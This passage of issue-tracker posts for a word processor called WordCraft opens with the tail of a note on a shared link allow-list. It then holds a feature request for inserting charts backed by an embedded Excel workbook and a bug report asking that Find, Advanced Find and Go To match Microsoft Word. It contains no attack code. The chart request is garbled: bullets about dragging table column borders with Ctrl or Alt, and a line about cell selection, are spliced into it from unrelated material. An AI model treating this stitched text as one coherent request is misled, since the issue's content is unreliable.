One shared allow-list (web, mail, `#bookmark`, relative path) used by the HTML/Markdown exporters, the HTML importer and the click handler. PR to follow.

title: Insert a chart backed by an embedded .xlsx workbook (like Word's Insert > Chart)
author: xmaxcooking
body:
Word's Insert > Chart embeds the source data as a real spreadsheet package (`externalData` relationship → `embeddings/Microsoft_Excel_Worksheet.xlsx`) and bakes `c:numCache`/`c:strCache` from it. WordCraft has no path to that.

- #409 plans `insert.chart` with its own data-grid editor, but the plan skips the embedded workbook outright (`c:externalData` omitted — "Word's Edit Data will then offer to create one").
- #319 preserves charts/SmartArt/OLE objects, embedded workbooks included, when round-tripping a file that already has them — but only for objects WordCraft didn't create itself.

A Word-made chart-from-Excel round-trips fine. WordCraft can't produce one.

Narrow first step: a command that takes a user's .xlsx (or a picked range), bakes the cache from it once, and copies the source .xlsx in unchanged as the `externalData` part. No xlsx writer needed — `embed.rs` already carries an embedded part through on save. Editing or re-baking the data afterward is a separate problem.

- **Ctrl** while dragging a column border: the columns to its right share the change in proportion, so the table keeps its width.
- **Alt** while dragging: the ruler shows the column widths.

- **With cells selected**, dragging one of their borders moves it only in the selected cells' rows (the other rows keep theirs).

I'm working on this (it builds on #600, #710 and the cell selection from #637); a PR will follow.

title: Find: Ctrl+F opens both Navigation pane and Find window; Find / Advanced Find / Go To don't match Word's behavior
author: netoverlord
body:
## Summary

The Find commands in WordCraft don't behave like Microsoft Word's. **Ctrl+F** opens two things at once (the Navigation pane and a Find window), **Advanced Find…** opens the same window as plain Find, and **Go To…** opens a small separate window.

## Current behavior

- **Ctrl+F** opens both the **Navigation** pane on the left and a **Find** window in the center.
- **Home › Editing › Find** opens a dropdown with three items:
  - **Find** opens the Find window.
  - **Advanced Find…** opens the same Find window.
  - **Go To…** opens a separate small Go To window where you type a page number.

## Expected behavior (as in Microsoft Word)

- **Ctrl+F** opens only the **Navigation** pane on the left.
- **Home › Editing › Find** (the button itself) also opens only the Navigation pane.
- **Home › Editing › Find › Advanced Find…** opens the **Find and Replace** dialog on the **Find** tab.
- **Home › Editing › Find › Go To…** opens the **Find and Replace** dialog on the **Go To** tab.
- **Home › Editing › Replace** opens the **Find and Replace** dialog on the **Replace** tab.
- The **Find and Replace** dialog has three tabs (**Find**, **Replace**, **Go To**), and the user can switch between them without closing the dialog.

## Suggested changes

1. Make Ctrl+F and the Find button open only the Navigation pane.
2. Make Advanced Find… open the Find and Replace dialog on the Find tab.
3. Replace the separate Go To window with the Go To tab of the Find and Replace dialog, and open it from Go To…
4. Make the Replace button open the same dialog on the Replace tab.
5. Add the three tabs (Find, Replace, Go To) to one shared dialog, so all three commands use the same window.

## Why this matters

- It matches the behavior users already know from Word.
- Ctrl+F is used constantly, and having two panels open at once is distracting and covers the document.
- One shared Find and Replace dialog is more consistent than separate windows for each function.
